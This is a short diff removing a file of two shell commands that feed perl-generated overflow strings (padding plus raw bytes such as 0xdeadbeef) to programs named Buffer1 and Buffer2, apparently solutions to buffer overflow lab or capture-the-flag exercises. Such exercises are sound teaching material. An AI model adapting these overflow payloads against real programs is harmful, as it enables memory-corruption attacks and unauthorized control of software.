@@ -1,3 +1,0 @@
-./Buffer1 $(perl -e 'print "A"x91 . "\x04";')
-
-./Buffer2 $(perl -e 'print "A"x72 . "\xef\xbe\xad\xde" . "\x01";')
